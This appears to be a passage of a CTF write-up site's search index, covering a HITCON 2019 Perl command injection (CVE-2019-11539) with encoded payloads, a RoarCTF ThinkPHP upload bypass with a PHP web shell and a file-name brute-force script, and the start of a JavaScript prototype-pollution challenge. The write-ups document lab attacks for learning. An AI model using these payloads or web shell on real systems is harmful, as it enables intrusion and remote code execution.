length $tpl 0 index ( $tpl , .. ) == -1 ) { $tpl = ./tmp/ . $tpl . .thtml ; require ( $tpl ) ; } It is easy to see that there is a command injection.Now, we have to figure out what to do with it. Exploit It's easy to think about going to orange's blog since he is the author of it. https://blog.orange.tw/2019/09/attacking-ssl-vpn-part-3-golden-pulse-secure-rce-chain.html Here we found CVE-2019-11539 and its payload: -r $x = ls / ,system $x # 2 /data/runtime/tmp/tt/setcookie.thtml.ttc We'll modify it a little bit and try to commit /cgi-bin/diag.cgi?option = -r%24x%3d%22ls+-lt+%2f%22%2csystem%24x%23+2%3e.%2ftmp%2fcallmecro.thtml+%3c tpl = callmecro After we commit it,we will get this total 96 -rwsr-sr-x 1 root root 8520 Oct 11 23 :57 $READ_FLAG $ -r-------- 1 root root 49 Oct 11 23 :59 FLAG ..... And then I stopped.The \"cat\" command could not be used, and the execution of $READ_FLAG$ failed. Finally, master lanmao told me about perl's syntax problems.The final payload: /cgi-bin/diag.cgi?option = -r%24x%3d%2f%24%2f%2fREAD_FLAG%2f%24system%24x%23+2%3e.%2ftmp%2fcallmecro.thtml+%3c tpl = callmecro Response: HTTP/1.1 200 OK Date: Sun, 12 Oct 2019 07 :04:37 GMT Server: Apache/2.4.29 ( Ubuntu ) Content-Length: 50 Connection: close Content-Type: text/html hitcon { Now I m sure u saw my Bl4ck H4t p4p3r :P } laomao tql.","title":"hitcon2019-virtual-public-network"},{"location":"web/CommandInjection/hitcon2019-virtual-public-network/#hitcon2019-luaticcallmecro","text":"Vulnerable Point of Your Network :)","title":"HITCON2019-luatic(CallMeCro)"},{"location":"web/CommandInjection/hitcon2019-virtual-public-network/#foreword","text":"Congratulations to myself, because I solved an international CTF questions for the first time(Although in the end it was master lanmao who reminded me of the proper way of writing payload).","title":"Foreword"},{"location":"web/CommandInjection/hitcon2019-virtual-public-network/#examination-site","text":"Perl Command Injection CVE-2019-11539","title":"Examination Site"},{"location":"web/CommandInjection/hitcon2019-virtual-public-network/#analysis","text":"As you view the source code through F12, you will find there is a hint !-- Hint for you : ) a href = diag.cgi diag.cgi /a a href = DSSafe.pm DSSafe.pm /a -- Then we open the diag.cgi to get its source code #!/usr/bin/perl use lib /var/www/html/ ; use strict ; use CGI () ; use DSSafe ; sub tcpdump_options_syntax_check { my $options = shift ; return $options if system ( timeout -s 9 2 /usr/bin/tcpdump -d $options /dev/null 2 1 ) == 0 ; return undef ; } print Content-type: text/html\\n\\n ; my $options = CGI::param ( options ) ; my $output = tcpdump_options_syntax_check ( $options ) ; # backdoor :) my $tpl = CGI::param ( tpl ) ; if ( length $tpl 0 index ( $tpl , .. ) == -1 ) { $tpl = ./tmp/ . $tpl . .thtml ; require ( $tpl ) ; } It is easy to see that there is a command injection.Now, we have to figure out what to do with it.","title":"Analysis"},{"location":"web/CommandInjection/hitcon2019-virtual-public-network/#exploit","text":"It's easy to think about going to orange's blog since he is the author of it. https://blog.orange.tw/2019/09/attacking-ssl-vpn-part-3-golden-pulse-secure-rce-chain.html Here we found CVE-2019-11539 and its payload: -r $x = ls / ,system $x # 2 /data/runtime/tmp/tt/setcookie.thtml.ttc We'll modify it a little bit and try to commit /cgi-bin/diag.cgi?option = -r%24x%3d%22ls+-lt+%2f%22%2csystem%24x%23+2%3e.%2ftmp%2fcallmecro.thtml+%3c tpl = callmecro After we commit it,we will get this total 96 -rwsr-sr-x 1 root root 8520 Oct 11 23 :57 $READ_FLAG $ -r-------- 1 root root 49 Oct 11 23 :59 FLAG ..... And then I stopped.The \"cat\" command could not be used, and the execution of $READ_FLAG$ failed. Finally, master lanmao told me about perl's syntax problems.The final payload: /cgi-bin/diag.cgi?option = -r%24x%3d%2f%24%2f%2fREAD_FLAG%2f%24system%24x%23+2%3e.%2ftmp%2fcallmecro.thtml+%3c tpl = callmecro Response: HTTP/1.1 200 OK Date: Sun, 12 Oct 2019 07 :04:37 GMT Server: Apache/2.4.29 ( Ubuntu ) Content-Length: 50 Connection: close Content-Type: text/html hitcon { Now I m sure u saw my Bl4ck H4t p4p3r :P } laomao tql.","title":"Exploit"},{"location":"web/FileUpload/RoarCTF-simple_upload/","text":"RoarCTF-simple_upload tip\uff1a\u8be5\u9898\u76ee\u5728BUUCTF\u7684\u9898\u5e93\u91cc\u6709\u73af\u5883\u590d\u73b0\uff1a https://buuoj.cn \u9898\u76ee\u63cf\u8ff0 \u6253\u5f00\u9898\u76ee\u94fe\u63a5\u4e4b\u540e\uff0c\u770b\u5230\u5982\u4e0b\u4ee3\u7801 ?php namespace Home\\Controller ; use Think\\Controller ; class IndexController extends Controller { public function index () { show_source ( __FILE__ ); } public function upload () { $uploadFile = $_FILES [ file ] ; if ( strstr ( strtolower ( $uploadFile [ name ]), .php ) ) { return false ; } $upload = new \\Think\\Upload (); // \u5b9e\u4f8b\u5316\u4e0a\u4f20\u7c7b $upload - maxSize = 4096 ; // \u8bbe\u7f6e\u9644\u4ef6\u4e0a\u4f20\u5927\u5c0f $upload - allowExts = array ( jpg , gif , png , jpeg ); // \u8bbe\u7f6e\u9644\u4ef6\u4e0a\u4f20\u7c7b\u578b $upload - rootPath = ./Public/Uploads/ ; // \u8bbe\u7f6e\u9644\u4ef6\u4e0a\u4f20\u76ee\u5f55 $upload - savePath = ; // \u8bbe\u7f6e\u9644\u4ef6\u4e0a\u4f20\u5b50\u76ee\u5f55 $info = $upload - upload () ; if ( ! $info ) { // \u4e0a\u4f20\u9519\u8bef\u63d0\u793a\u9519\u8bef\u4fe1\u606f $this - error ( $upload - getError ()); return ; } else { // \u4e0a\u4f20\u6210\u529f \u83b7\u53d6\u4e0a\u4f20\u6587\u4ef6\u4fe1\u606f $url = __ROOT__ . substr ( $upload - rootPath , 1 ) . $info [ file ][ savepath ] . $info [ file ][ savename ] ; echo json_encode ( array ( url = $url , success = 1 )); } } } \u53ef\u4ee5\u53d1\u73b0\uff0c\u8be5\u7ad9\u662f ThinkPHP \u5199\u7684\u4e00\u4e2a\u6587\u4ef6\u4e0a\u4f20\u7f51\u7ad9\u3002 \u9898\u76ee\u5206\u6790 1\u3001\u5206\u6790\u4ee3\u7801\u53ef\u77e5\uff0c\u8be5\u7ad9\u53ef\u4ee5\u901a\u8fc7 POST \u65b9\u6cd5\u5b9e\u73b0\u4e0a\u4f20\u6587\u4ef6\u529f\u80fd\uff0c\u4f46\u662f\u4ece\u7b2c14\u884c\u4ee3\u7801\u53d1\u73b0php\u540e\u7f00\u7684\u6587\u4ef6\u88ab\u7981\u6b62\u4e0a\u4f20\uff0c\u56e0\u6b64\u6211\u4eec\u9700\u8981\u60f3\u529e\u6cd5\u7ed5\u8fc7\u9650\u5236\uff0c\u4e0a\u4f20 php\u5c0f\u9a6c \u3002 2\u3001\u8be5\u811a\u672c\u901a\u8fc7 allowExts \u65b9\u6cd5\u8bbe\u7f6e\u4e0a\u4f20\u7c7b\u578b\uff0c\u4f46\u662f\u67e5\u9605\u8d44\u6599\u5f97\u77e5\u8fd9\u79cd\u4f7f\u7528\u65b9\u6cd5\u662f\u4e0d\u5bf9\u7684\uff0c\u5e76\u4e0d\u80fd\u9650\u5236\u4e0a\u4f20\u7684\u6587\u4ef6\u7c7b\u578b\u3002 3\u3001upload()\u51fd\u6570\u4e0d\u4f20\u53c2\u65f6\u4e3a\u591a\u6587\u4ef6\u4e0a\u4f20\uff0c\u6574\u4e2a $_FILES \u6570\u7ec4\u7684\u6587\u4ef6\u90fd\u4f1a\u4e0a\u4f20\u4fdd\u5b58\uff0c\u53ef\u4ee5\u5229\u7528\u8be5\u5c5e\u6027\u901a\u8fc7\u4e00\u6b21\u8bbf\u95ee\u4e0a\u4f20\u591a\u4e2a\u6587\u4ef6\u3002 \u7ed3\u5408\u4ee5\u4e0a\u5206\u6790\u5f97\u77e5\u7684\u5185\u5bb9\u53ef\u77e5\uff0c\u53ef\u4ee5\u5229\u7528 $_FILES \u6570\u7ec4\u4e0a\u4f20\u591a\u4e2a\u6587\u4ef6\u6765\u7ed5\u8fc7\u5bf9php\u7684\u8fc7\u6ee4\u3002 \u89e3\u9898\u8fc7\u7a0b 1\u3001\u6d4b\u8bd5\u4e0a\u4f20\u529f\u80fd \u9996\u5148\u7f16\u5199python\u811a\u672c\u5411\u7f51\u7ad9POST\u4e00\u4e2a\u975ephp\u7684\u6587\u4ef6\uff0c\u8fd9\u91cc\u4e0a\u4f20\u4e86\u4e00\u4e2a txt \u6587\u4ef6\uff0c\u6d4b\u8bd5\u80fd\u5426\u6b63\u5e38\u4e0a\u4f20\u6587\u4ef6\uff0c\u4e0b\u9762\u662f\u4e0a\u4f20\u6d4b\u8bd5\u4ee3\u7801\u6bb5\uff1a url = http://c85e5a48-c5f8-4a5b-9a30-6a81677fd75e.node3.buuoj.cn path = url + /index.php/home/index/upload files = { file :( ma.txt , hello )} r = requests . post ( path , files = files ) print ( r . text ) \u56de\u663e\u5185\u5bb9\u5982\u4e0b: { url : \\/Public\\/Uploads\\/2019-10-24\\/5db1841fb439d.txt , success :1} \u80fd\u591f\u6210\u529f\u4e0a\u4f20\u6587\u4ef6\u3002 2\u3001\u6d4b\u8bd5\u4e0a\u4f20php\u6587\u4ef6\uff1a url = http://c85e5a48-c5f8-4a5b-9a30-6a81677fd75e.node3.buuoj.cn path = url + /index.php/home/index/upload files = { file :( ma.txt , hello ), file1 :( ma.php , ?php eval($_GET[ cmd ]); )} r = requests . post ( path , files = files ) \u56de\u663e\u5185\u5bb9\u5982\u4e0b\uff1a { url : \\/Public\\/Uploads\\/2019-10-24\\/5db18420027a3.txt , success :1} { url : \\/Public\\/Uploads\\/ , success :1} \u7531\u56de\u663e\u53ef\u77e5\uff0c\u6211\u4eec\u6210\u529f\u4e0a\u4f20\u4e86php\u6587\u4ef6,\u4f46\u662f\u5e76\u6ca1\u6709\u56de\u663ephp\u7684\u6587\u4ef6\u540d * \u5176\u5b9e\u5728\u6bd4\u8d5b\u505a\u8d5b\u9898\u7684\u65f6\u5019\u53d1\u73b0\uff0c\u76f4\u63a5\u4e0a\u4f20php\u6587\u4ef6\u4e5f\u662f\u53ef\u4ee5\u6210\u529f\u7684\uff0c\u53ea\u4e0d\u8fc7\u4e5f\u4e0d\u4f1a\u56de\u663e\u6587\u4ef6\u540d\u3002 \u901a\u8fc7\u591a\u6b21\u4e0a\u4f20\u53d1\u73b0\u89c4\u5f8b\uff1a\u65b0\u6587\u4ef6\u540d\u662f\u4ee5 \u5fae\u79d2 \u4e3a\u5355\u4f4d\u8f6c \u5341\u516d\u8fdb\u5236 \u7684\u5b57\u7b26\u4e32\uff08\u540e\u6765\u5728WP\u4e2d\u4e86\u89e3\u5230ThinkPHP\u4e2d\uff0c\u6587\u4ef6\u540d\u662f\u901a\u8fc7 uniqid \u51fd\u6570\u751f\u6210\u7684\uff0c uniqid \u51fd\u6570\u662f\u57fa\u4e8e\u4ee5\u5fae\u79d2\u8ba1\u7684\u5f53\u524d\u65f6\u95f4\u8ba1\u7b97\u7684\uff09 \u56e0\u6b64\u627e\u5230php\u7684\u6587\u4ef6\u540d\uff0c\u7406\u8bba\u4e0a\u5c31\u53ef\u4ee5\u6210\u529f\u8fde\u63a5\u5230\u6211\u4eec\u4e0a\u4f20\u7684\u5c0f\u9a6c\uff0c\u800c\u65b9\u6cd5\u53ea\u6709\u4e00\u4e2a\uff0c\u90a3\u5c31\u662f \u7206\u7834 \u3002 3\u3001\u7206\u7834php\u6587\u4ef6\u540d \u7206\u7834\u4ee3\u7801\u5982\u4e0b\uff1a import requests url = http://c85e5a48-c5f8-4a5b-9a30-6a81677fd75e.node3.buuoj.cn path = url + /index.php/home/index/upload files = { file :( ma.txt , hello ), file1 :( ma.php , ?php eval($_GET[ cmd ]); )} r = requests . post ( path , files = files ) t1 = r . text . split ( / )[ - 1 ] . split ( . )[ 0 ] print ( t1 ) s = 1234567890abcdef for i in s : for j in s : for k in s : path = url + /Public/Uploads/2019-10-24/ + t1 [: - 3 ] + %s%s%s .php % ( i , j , k ) r = requests . get ( path , timeout = 1 ) print ( path ) if r . status_code != 404 : print ( path ) # print(r.text) break \u7531\u4e8e\u6211\u4eec\u662f\u5229\u7528 $_FILES \u6570\u7ec4\u7684\u5c5e\u6027\u5b9e\u73b0\u4e00\u6b21\u8bbf\u95ee\uff0c\u4e0a\u4f20\u4e24\u4e2a\u6587\u4ef6\uff0c\u56e0\u6b64\u4e2d\u95f4\u76f8\u9694\u7684\u65f6\u95f4\u8f83\u77ed\uff0c\u5229\u7528\u4ee5\u4e0a\u5355\u7ebf\u7a0b\u7684\u7206\u7834\u5373\u53ef\u62ff\u5230php\u7684\u6587\u4ef6\u540d\uff0c\u7136\u540e\u5e38\u89c4\u64cd\u4f5c\u8fde\u63a5\u5c0f\u9a6c\u62ffflag\u3002 \u8fd9\u91cc\u8fd8\u6709\u53e6\u4e00\u79cd\u65b9\u6cd5\u662f\u5229\u7528BP\u8fdb\u884c\u7206\u7834\uff0c\u53ea\u9700\u7206\u7834\u6587\u4ef6\u540d\u7684\u540e\u4e09\u4e2a\u5b57\u7b26\u5373\u53ef\uff0c\u5176\u5b9e\u539f\u7406\u662f\u4e00\u6837\u7684\uff0c\u53ea\u662f\u5de5\u5177\u4e0d\u540c\u800c\u5df2\u3002 \u4f46\u662f\u5728BUUCTF\u7684\u7ad9\u4e0a\u4f7f\u7528BP\u7206\u7834\u65f6\u4f1a\u56de\u663e 429 Too Many Requests (\u592a\u591a\u8bf7\u6c42) ,\u540c\u6837\u5982\u679c\u7528\u81ea\u5df1\u7684\u591a\u7ebf\u7a0b\u4ee3\u7801\u53bb\u7206\u7834\u4e5f\u4f1a\u9047\u5230\u8fd9\u4e2a\u95ee\u9898\uff0c\u662f\u7f51\u7ad9\u4e3a\u4e86\u9650\u5236\u5ba2\u6237\u7aef\u7684\u8bf7\u6c42\u6570\u91cf\u7684\u914d\u7f6e\uff0c\u6ca1\u529e\u6cd5\uff0c\u53ea\u80fd\u7528\u5355\u7ebf\u7a0b\u3002 \u601d\u8003\u603b\u7ed3 \u5728\u6bd4\u8d5b\u7684\u65f6\u5019\uff0c\u7531\u4e8e\u4e0d\u4e86\u89e3\u4ee3\u7801\u4e2d\u4e00\u6b21\u8bbf\u95ee\u53ef\u4ee5\u4e0a\u4f20\u591a\u4e2a\u6587\u4ef6\u7684\u6f0f\u6d1e\uff0c\u4fbf\u91c7\u7528\u4e86\u4e0a\u4f20\u4e09\u6b21\u6587\u4ef6\u7684\u65b9\u6cd5\uff08\u7b2c\u4e00\u6b21\u4e0a\u4f20txt\uff0c\u7b2c\u4e8c\u6b21\u4f20php\u5c0f\u9a6c\uff0c\u7b2c\u4e09\u6b21\u518d\u4f20txt\uff0c\u4ee5\u6b64\u5f97\u5230\u547d\u540d\u8303\u56f4\uff09\uff0c\u8fd9\u5c31\u5bfc\u81f4\u7b2c\u4e00\u6b21\u548c\u7b2c\u4e09\u6b21\u62ff\u5230\u7684\u6587\u4ef6\u540d\u8303\u56f4\u6bd4\u8f83\u5e7f\uff0c\u7206\u7834\u56f0\u96be\uff0c\u5f53\u65f6\u81ea\u5df1\u5199\u4e86\u4e2a\u8e69\u811a\u7684\u591a\u7ebf\u7a0b\uff0c\u6700\u7ec8\u4e5f\u6ca1\u80fd\u6210\u529f\u7206\u7834\u51fa\u6587\u4ef6\u540d... \u8d5b\u540e\u770b\u4e86\u51e0\u4e2aWP\u5173\u952e\u6b65\u9aa4\u8fd8\u662f\u5728\u4e8e\u7206\u7834\u6587\u4ef6\u540d\uff0c\u6211\u91c7\u7528\u7684\u8fd9\u79cd\u65b9\u6cd5\u4e5f\u6709\u4eba\u6210\u529f\u62ff\u5230\u4e86flag...\u4e0d\u8fc7\u6b63\u89e3\u5e94\u8be5\u8fd8\u662f\u5229\u7528\u6f0f\u6d1e\u4e00\u6b21\u4e0a\u4f20\u591a\u4e2a\u6587\u4ef6\u6765\u7206\u7834\u5427\u3002","title":"RoarCTF-simple_upload"},{"location":"web/FileUpload/RoarCTF-simple_upload/#roarctf-simple_upload","text":"tip\uff1a\u8be5\u9898\u76ee\u5728BUUCTF\u7684\u9898\u5e93\u91cc\u6709\u73af\u5883\u590d\u73b0\uff1a https://buuoj.cn","title":"RoarCTF-simple_upload"},{"location":"web/FileUpload/RoarCTF-simple_upload/#_1","text":"\u6253\u5f00\u9898\u76ee\u94fe\u63a5\u4e4b\u540e\uff0c\u770b\u5230\u5982\u4e0b\u4ee3\u7801 ?php namespace Home\\Controller ; use Think\\Controller ; class IndexController extends Controller { public function index () { show_source ( __FILE__ ); } public function upload () { $uploadFile = $_FILES [ file ] ; if ( strstr ( strtolower ( $uploadFile [ name ]), .php ) ) { return false ; } $upload = new \\Think\\Upload (); // \u5b9e\u4f8b\u5316\u4e0a\u4f20\u7c7b $upload - maxSize = 4096 ; // \u8bbe\u7f6e\u9644\u4ef6\u4e0a\u4f20\u5927\u5c0f $upload - allowExts = array ( jpg , gif , png , jpeg ); // \u8bbe\u7f6e\u9644\u4ef6\u4e0a\u4f20\u7c7b\u578b $upload - rootPath = ./Public/Uploads/ ; // \u8bbe\u7f6e\u9644\u4ef6\u4e0a\u4f20\u76ee\u5f55 $upload - savePath = ; // \u8bbe\u7f6e\u9644\u4ef6\u4e0a\u4f20\u5b50\u76ee\u5f55 $info = $upload - upload () ; if ( ! $info ) { // \u4e0a\u4f20\u9519\u8bef\u63d0\u793a\u9519\u8bef\u4fe1\u606f $this - error ( $upload - getError ()); return ; } else { // \u4e0a\u4f20\u6210\u529f \u83b7\u53d6\u4e0a\u4f20\u6587\u4ef6\u4fe1\u606f $url = __ROOT__ . substr ( $upload - rootPath , 1 ) . $info [ file ][ savepath ] . $info [ file ][ savename ] ; echo json_encode ( array ( url = $url , success = 1 )); } } } \u53ef\u4ee5\u53d1\u73b0\uff0c\u8be5\u7ad9\u662f ThinkPHP \u5199\u7684\u4e00\u4e2a\u6587\u4ef6\u4e0a\u4f20\u7f51\u7ad9\u3002","title":"\u9898\u76ee\u63cf\u8ff0"},{"location":"web/FileUpload/RoarCTF-simple_upload/#_2","text":"1\u3001\u5206\u6790\u4ee3\u7801\u53ef\u77e5\uff0c\u8be5\u7ad9\u53ef\u4ee5\u901a\u8fc7 POST \u65b9\u6cd5\u5b9e\u73b0\u4e0a\u4f20\u6587\u4ef6\u529f\u80fd\uff0c\u4f46\u662f\u4ece\u7b2c14\u884c\u4ee3\u7801\u53d1\u73b0php\u540e\u7f00\u7684\u6587\u4ef6\u88ab\u7981\u6b62\u4e0a\u4f20\uff0c\u56e0\u6b64\u6211\u4eec\u9700\u8981\u60f3\u529e\u6cd5\u7ed5\u8fc7\u9650\u5236\uff0c\u4e0a\u4f20 php\u5c0f\u9a6c \u3002 2\u3001\u8be5\u811a\u672c\u901a\u8fc7 allowExts \u65b9\u6cd5\u8bbe\u7f6e\u4e0a\u4f20\u7c7b\u578b\uff0c\u4f46\u662f\u67e5\u9605\u8d44\u6599\u5f97\u77e5\u8fd9\u79cd\u4f7f\u7528\u65b9\u6cd5\u662f\u4e0d\u5bf9\u7684\uff0c\u5e76\u4e0d\u80fd\u9650\u5236\u4e0a\u4f20\u7684\u6587\u4ef6\u7c7b\u578b\u3002 3\u3001upload()\u51fd\u6570\u4e0d\u4f20\u53c2\u65f6\u4e3a\u591a\u6587\u4ef6\u4e0a\u4f20\uff0c\u6574\u4e2a $_FILES \u6570\u7ec4\u7684\u6587\u4ef6\u90fd\u4f1a\u4e0a\u4f20\u4fdd\u5b58\uff0c\u53ef\u4ee5\u5229\u7528\u8be5\u5c5e\u6027\u901a\u8fc7\u4e00\u6b21\u8bbf\u95ee\u4e0a\u4f20\u591a\u4e2a\u6587\u4ef6\u3002 \u7ed3\u5408\u4ee5\u4e0a\u5206\u6790\u5f97\u77e5\u7684\u5185\u5bb9\u53ef\u77e5\uff0c\u53ef\u4ee5\u5229\u7528 $_FILES \u6570\u7ec4\u4e0a\u4f20\u591a\u4e2a\u6587\u4ef6\u6765\u7ed5\u8fc7\u5bf9php\u7684\u8fc7\u6ee4\u3002","title":"\u9898\u76ee\u5206\u6790"},{"location":"web/FileUpload/RoarCTF-simple_upload/#_3","text":"","title":"\u89e3\u9898\u8fc7\u7a0b"},{"location":"web/FileUpload/RoarCTF-simple_upload/#1","text":"\u9996\u5148\u7f16\u5199python\u811a\u672c\u5411\u7f51\u7ad9POST\u4e00\u4e2a\u975ephp\u7684\u6587\u4ef6\uff0c\u8fd9\u91cc\u4e0a\u4f20\u4e86\u4e00\u4e2a txt \u6587\u4ef6\uff0c\u6d4b\u8bd5\u80fd\u5426\u6b63\u5e38\u4e0a\u4f20\u6587\u4ef6\uff0c\u4e0b\u9762\u662f\u4e0a\u4f20\u6d4b\u8bd5\u4ee3\u7801\u6bb5\uff1a url = http://c85e5a48-c5f8-4a5b-9a30-6a81677fd75e.node3.buuoj.cn path = url + /index.php/home/index/upload files = { file :( ma.txt , hello )} r = requests . post ( path , files = files ) print ( r . text ) \u56de\u663e\u5185\u5bb9\u5982\u4e0b: { url : \\/Public\\/Uploads\\/2019-10-24\\/5db1841fb439d.txt , success :1} \u80fd\u591f\u6210\u529f\u4e0a\u4f20\u6587\u4ef6\u3002","title":"1\u3001\u6d4b\u8bd5\u4e0a\u4f20\u529f\u80fd"},{"location":"web/FileUpload/RoarCTF-simple_upload/#2php","text":"url = http://c85e5a48-c5f8-4a5b-9a30-6a81677fd75e.node3.buuoj.cn path = url + /index.php/home/index/upload files = { file :( ma.txt , hello ), file1 :( ma.php , ?php eval($_GET[ cmd ]); )} r = requests . post ( path , files = files ) \u56de\u663e\u5185\u5bb9\u5982\u4e0b\uff1a { url : \\/Public\\/Uploads\\/2019-10-24\\/5db18420027a3.txt , success :1} { url : \\/Public\\/Uploads\\/ , success :1} \u7531\u56de\u663e\u53ef\u77e5\uff0c\u6211\u4eec\u6210\u529f\u4e0a\u4f20\u4e86php\u6587\u4ef6,\u4f46\u662f\u5e76\u6ca1\u6709\u56de\u663ephp\u7684\u6587\u4ef6\u540d * \u5176\u5b9e\u5728\u6bd4\u8d5b\u505a\u8d5b\u9898\u7684\u65f6\u5019\u53d1\u73b0\uff0c\u76f4\u63a5\u4e0a\u4f20php\u6587\u4ef6\u4e5f\u662f\u53ef\u4ee5\u6210\u529f\u7684\uff0c\u53ea\u4e0d\u8fc7\u4e5f\u4e0d\u4f1a\u56de\u663e\u6587\u4ef6\u540d\u3002 \u901a\u8fc7\u591a\u6b21\u4e0a\u4f20\u53d1\u73b0\u89c4\u5f8b\uff1a\u65b0\u6587\u4ef6\u540d\u662f\u4ee5 \u5fae\u79d2 \u4e3a\u5355\u4f4d\u8f6c \u5341\u516d\u8fdb\u5236 \u7684\u5b57\u7b26\u4e32\uff08\u540e\u6765\u5728WP\u4e2d\u4e86\u89e3\u5230ThinkPHP\u4e2d\uff0c\u6587\u4ef6\u540d\u662f\u901a\u8fc7 uniqid \u51fd\u6570\u751f\u6210\u7684\uff0c uniqid \u51fd\u6570\u662f\u57fa\u4e8e\u4ee5\u5fae\u79d2\u8ba1\u7684\u5f53\u524d\u65f6\u95f4\u8ba1\u7b97\u7684\uff09 \u56e0\u6b64\u627e\u5230php\u7684\u6587\u4ef6\u540d\uff0c\u7406\u8bba\u4e0a\u5c31\u53ef\u4ee5\u6210\u529f\u8fde\u63a5\u5230\u6211\u4eec\u4e0a\u4f20\u7684\u5c0f\u9a6c\uff0c\u800c\u65b9\u6cd5\u53ea\u6709\u4e00\u4e2a\uff0c\u90a3\u5c31\u662f \u7206\u7834 \u3002","title":"2\u3001\u6d4b\u8bd5\u4e0a\u4f20php\u6587\u4ef6\uff1a"},{"location":"web/FileUpload/RoarCTF-simple_upload/#3php","text":"\u7206\u7834\u4ee3\u7801\u5982\u4e0b\uff1a import requests url = http://c85e5a48-c5f8-4a5b-9a30-6a81677fd75e.node3.buuoj.cn path = url + /index.php/home/index/upload files = { file :( ma.txt , hello ), file1 :( ma.php , ?php eval($_GET[ cmd ]); )} r = requests . post ( path , files = files ) t1 = r . text . split ( / )[ - 1 ] . split ( . )[ 0 ] print ( t1 ) s = 1234567890abcdef for i in s : for j in s : for k in s : path = url + /Public/Uploads/2019-10-24/ + t1 [: - 3 ] + %s%s%s .php % ( i , j , k ) r = requests . get ( path , timeout = 1 ) print ( path ) if r . status_code != 404 : print ( path ) # print(r.text) break \u7531\u4e8e\u6211\u4eec\u662f\u5229\u7528 $_FILES \u6570\u7ec4\u7684\u5c5e\u6027\u5b9e\u73b0\u4e00\u6b21\u8bbf\u95ee\uff0c\u4e0a\u4f20\u4e24\u4e2a\u6587\u4ef6\uff0c\u56e0\u6b64\u4e2d\u95f4\u76f8\u9694\u7684\u65f6\u95f4\u8f83\u77ed\uff0c\u5229\u7528\u4ee5\u4e0a\u5355\u7ebf\u7a0b\u7684\u7206\u7834\u5373\u53ef\u62ff\u5230php\u7684\u6587\u4ef6\u540d\uff0c\u7136\u540e\u5e38\u89c4\u64cd\u4f5c\u8fde\u63a5\u5c0f\u9a6c\u62ffflag\u3002 \u8fd9\u91cc\u8fd8\u6709\u53e6\u4e00\u79cd\u65b9\u6cd5\u662f\u5229\u7528BP\u8fdb\u884c\u7206\u7834\uff0c\u53ea\u9700\u7206\u7834\u6587\u4ef6\u540d\u7684\u540e\u4e09\u4e2a\u5b57\u7b26\u5373\u53ef\uff0c\u5176\u5b9e\u539f\u7406\u662f\u4e00\u6837\u7684\uff0c\u53ea\u662f\u5de5\u5177\u4e0d\u540c\u800c\u5df2\u3002 \u4f46\u662f\u5728BUUCTF\u7684\u7ad9\u4e0a\u4f7f\u7528BP\u7206\u7834\u65f6\u4f1a\u56de\u663e 429 Too Many Requests (\u592a\u591a\u8bf7\u6c42) ,\u540c\u6837\u5982\u679c\u7528\u81ea\u5df1\u7684\u591a\u7ebf\u7a0b\u4ee3\u7801\u53bb\u7206\u7834\u4e5f\u4f1a\u9047\u5230\u8fd9\u4e2a\u95ee\u9898\uff0c\u662f\u7f51\u7ad9\u4e3a\u4e86\u9650\u5236\u5ba2\u6237\u7aef\u7684\u8bf7\u6c42\u6570\u91cf\u7684\u914d\u7f6e\uff0c\u6ca1\u529e\u6cd5\uff0c\u53ea\u80fd\u7528\u5355\u7ebf\u7a0b\u3002","title":"3\u3001\u7206\u7834php\u6587\u4ef6\u540d"},{"location":"web/FileUpload/RoarCTF-simple_upload/#_4","text":"\u5728\u6bd4\u8d5b\u7684\u65f6\u5019\uff0c\u7531\u4e8e\u4e0d\u4e86\u89e3\u4ee3\u7801\u4e2d\u4e00\u6b21\u8bbf\u95ee\u53ef\u4ee5\u4e0a\u4f20\u591a\u4e2a\u6587\u4ef6\u7684\u6f0f\u6d1e\uff0c\u4fbf\u91c7\u7528\u4e86\u4e0a\u4f20\u4e09\u6b21\u6587\u4ef6\u7684\u65b9\u6cd5\uff08\u7b2c\u4e00\u6b21\u4e0a\u4f20txt\uff0c\u7b2c\u4e8c\u6b21\u4f20php\u5c0f\u9a6c\uff0c\u7b2c\u4e09\u6b21\u518d\u4f20txt\uff0c\u4ee5\u6b64\u5f97\u5230\u547d\u540d\u8303\u56f4\uff09\uff0c\u8fd9\u5c31\u5bfc\u81f4\u7b2c\u4e00\u6b21\u548c\u7b2c\u4e09\u6b21\u62ff\u5230\u7684\u6587\u4ef6\u540d\u8303\u56f4\u6bd4\u8f83\u5e7f\uff0c\u7206\u7834\u56f0\u96be\uff0c\u5f53\u65f6\u81ea\u5df1\u5199\u4e86\u4e2a\u8e69\u811a\u7684\u591a\u7ebf\u7a0b\uff0c\u6700\u7ec8\u4e5f\u6ca1\u80fd\u6210\u529f\u7206\u7834\u51fa\u6587\u4ef6\u540d... \u8d5b\u540e\u770b\u4e86\u51e0\u4e2aWP\u5173\u952e\u6b65\u9aa4\u8fd8\u662f\u5728\u4e8e\u7206\u7834\u6587\u4ef6\u540d\uff0c\u6211\u91c7\u7528\u7684\u8fd9\u79cd\u65b9\u6cd5\u4e5f\u6709\u4eba\u6210\u529f\u62ff\u5230\u4e86flag...\u4e0d\u8fc7\u6b63\u89e3\u5e94\u8be5\u8fd8\u662f\u5229\u7528\u6f0f\u6d1e\u4e00\u6b21\u4e0a\u4f20\u591a\u4e2a\u6587\u4ef6\u6765\u7206\u7834\u5427\u3002","title":"\u601d\u8003\u603b\u7ed3"},{"location":"web/JavaScript_prototype_chain_pollution/car_repair/","text":"Car Repair Shop \"Your Car broke down?! Come to our shop, we repair all cars! Even very old ones.\" Examination Site JavaScript prototype chain pollution XSS Analysis Viewing the source code,we will found several key files script src = assets/js/car.class.js / script script src = assets/js/util.js / script !-- script src= assets/js/car.key.js /script -- From car.class.js powerOn () { if ( this . isStarted ()) { infobox ( `Well Done!` ) nextCar () } else { $ ( .chargeup )[ 0 ]. play () } } repair () { if ( urlParams . has ( repair )) { $ . extend ( true , this , JSON . parse ( urlParams . get ( repair ))) } } ignition () { if ( this . key == ) { infobox ( `Looks like the key got lost. No wonder the car is not starting ...` ) } if ( this . key == ?? ) { infobox ( `The car started!` ) this . start () } } } From the Car class, we know the process of repairing the car: Repair()- powerOn()- ignition().In addition,we found the exploit: $.extend(true, this, JSON.parse(urlParams.get('repair'))) It is easy to know that the exploit is \"JavaScript Prototypein pollution\".We can write the key through the prototype chain. From car.class.js porsche . key = ?? porsche . start () This js file can get the porsche's key and let it start.We have to load it. From util.js const urlParams = new URLSearchParams ( window . location . search ) const h = location . hash . slice ( 1 ) const bugatti = new Car ( Bugatti , T35 , green , assets/images/bugatti.png ) const porsche = new Car ( Porsche , 911 , yellow , assets/images/porsche.png ) const cars = [ bugatti , porsche ] porsche . repair = () = { if ( ! bugatti . isStarted ()){ infobox ( `Not so fast. Repair the other car first!` ) } else if ( $ . md5 ( porsche ) == 